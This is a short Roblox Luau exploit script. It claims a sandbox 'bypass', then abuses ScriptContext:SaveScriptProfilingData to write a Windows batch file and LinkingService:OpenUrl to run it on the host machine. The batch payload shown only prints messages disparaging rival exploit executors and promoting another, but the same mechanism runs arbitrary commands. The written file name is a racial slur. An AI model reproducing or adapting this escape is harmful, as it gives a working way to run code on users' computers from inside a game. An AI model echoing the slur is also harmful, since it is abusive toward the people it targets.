setfenv(1, getfenv(require))
getfenv().game = nil -- the bypass from incognito v2 server

local b = game:FindService('ScriptContext')
local a = game:GetService('LinkingService')

Code = [[
@echo off
echo ------------------------------------------------------------------------------------------------------------------------
echo Dont use xeno, cloudy, zorara, jjsploit, or nezur if you care about security. These executors are using stolen code from original devs.
echo ------------------------------------------------------------------------------------------------------------------------
echo Use Solara if you want a good external executor.
echo ------------------------------------------------------------------------------------------------------------------------
pause
]]

a:OpenUrl(b:SaveScriptProfilingData(Code, "nigga.bat"))
